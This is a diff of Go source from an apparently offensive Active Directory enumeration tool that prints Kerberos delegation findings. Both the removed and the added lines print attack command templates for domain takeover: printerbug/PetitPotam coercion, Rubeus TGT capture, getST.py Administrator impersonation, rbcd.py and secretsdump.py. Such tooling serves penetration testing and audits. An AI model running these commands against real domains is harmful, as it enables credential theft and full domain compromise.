@@ -76,7 +76,6 @@ func AnalyzeDelegation(client *adldap.Client) (*DelegationResult, error) {
 		Domain: client.GetDomain(),
 	}
 
-	color.Blue("\n[*] Analyzing delegation configurations...")
 
 	if err := findUnconstrainedUsers(client, result); err != nil {
 		return nil, err
@@ -91,7 +90,6 @@ func AnalyzeDelegation(client *adldap.Client) (*DelegationResult, error) {
 		return nil, err
 	}
 
-	color.Green("[+] Found %d delegation findings", len(result.Findings))
 	return result, nil
 }
 
@@ -208,8 +206,9 @@ func findRBCD(client *adldap.Client, result *DelegationResult) error {
 // ============================================================
 
 func PrintDelegationResult(dr *DelegationResult) {
+	color.Cyan("\n  DELEGATION")
 	if len(dr.Findings) == 0 {
-		color.Green("[+] No dangerous delegation configurations found")
+		color.White("  none found")
 		return
 	}
 
@@ -218,70 +217,41 @@ func PrintDelegationResult(dr *DelegationResult) {
 	rbcd := filterByDelegationType(dr.Findings, DelegationRBCD)
 
 	if len(unconstrained) > 0 {
-		color.Red("\n[!] Unconstrained Delegation (%d) — CRITICAL:\n", len(unconstrained))
+		color.Red("  UNCONSTRAINED (%d)", len(unconstrained))
 		for _, f := range unconstrained {
 			printDelegationFinding(f)
 		}
-		printUnconstrainedExploitHints(dr.Domain)
+		color.Cyan("\n  next steps (unconstrained):")
+		color.White("    printerbug.py %s/<user>:<pass>@<DC> <vuln-host>  # trigger DC auth", dr.Domain)
+		color.White("    rubeus.exe monitor /interval:1 /nowrap            # capture TGT")
 	}
-
 	if len(constrained) > 0 {
-		color.Yellow("\n[!] Constrained Delegation (%d):\n", len(constrained))
+		color.Yellow("\n  CONSTRAINED (%d)", len(constrained))
 		for _, f := range constrained {
 			printDelegationFinding(f)
-			if len(f.AllowedServices) > 0 {
-				color.White("      Allowed services:")
-				for _, svc := range f.AllowedServices {
-					color.Cyan("        - %s", svc)
-				}
+			for _, svc := range f.AllowedServices {
+				color.White("    allowed: %s", svc)
 			}
 		}
-		printConstrainedExploitHints(dr.Domain)
+		color.Cyan("\n  next steps (constrained):")
+		color.White("    getST.py -spn <allowed-spn> -impersonate Administrator %s/<account>:<pass>", dr.Domain)
 	}
-
 	if len(rbcd) > 0 {
-		color.Yellow("\n[!] Resource-Based Constrained Delegation (%d):\n", len(rbcd))
+		color.Yellow("\n  RBCD (%d)", len(rbcd))
 		for _, f := range rbcd {
 			printDelegationFinding(f)
 		}
-		printRBCDExploitHints(dr.Domain)
+		color.Cyan("\n  next steps (rbcd):")
+		color.White("    rbcd.py -f <controlled> -t <target> -dc-ip <DC> %s/<user>:<pass>", dr.Domain)
 	}
 }
 
 func printDelegationFinding(f DelegationFinding) {
-	icon := "🟠"
-	if f.IsHighRisk {
-		icon = "🔴"
-	}
-	color.White("\n  %s [%s] %s", icon, strings.ToUpper(f.ObjectType), f.SAMAccountName)
-	color.White("      DN:   %s", f.DN)
-	color.White("      Type: %s", f.DelegationType)
+	risk := ""
 	if f.RiskReason != "" {
-		color.Red("      Risk: %s", f.RiskReason)
+		risk = "  ! " + f.RiskReason
 	}
-}
-
-func printUnconstrainedExploitHints(domain string) {
-	color.Cyan("\n[*] Exploitation hints (Unconstrained Delegation):")
-	color.White("  1. Trigger authentication from DC to vulnerable host:")
-	color.White("     printerbug.py %s/<user>:<pass>@<DC-IP> <vuln-host-IP>", domain)
-	color.White("     OR: PetitPotam.py -u <user> -p <pass> <vuln-host-IP> <DC-IP>")
-	color.White("  2. Capture TGT on vulnerable host:")
-	color.White("     rubeus.exe monitor /interval:1 /nowrap")
-	color.White("  3. Pass-The-Ticket → DCSync")
-}
-
-func printConstrainedExploitHints(domain string) {
-	color.Cyan("\n[*] Exploitation hints (Constrained Delegation):")
-	color.White("    getST.py -spn <allowed-spn> -impersonate Administrator %s/<account>:<pass>", domain)
-	color.White("    export KRB5CCNAME=Administrator.ccache")
-	color.White("    secretsdump.py -k -no-pass %s/Administrator@<target>", domain)
-}
-
-func printRBCDExploitHints(domain string) {
-	color.Cyan("\n[*] Exploitation hints (RBCD):")
-	color.White("    rbcd.py -f <controlled-computer> -t <target> -dc-ip <DC> %s/<user>:<pass>", domain)
-	color.White("    getST.py -spn cifs/<target> -impersonate Administrator %s/<controlled-computer>$:<pass>", domain)
+	color.White("  %-20s  %-10s%s", f.SAMAccountName, f.ObjectType, risk)
 }
 
 // ============================================================
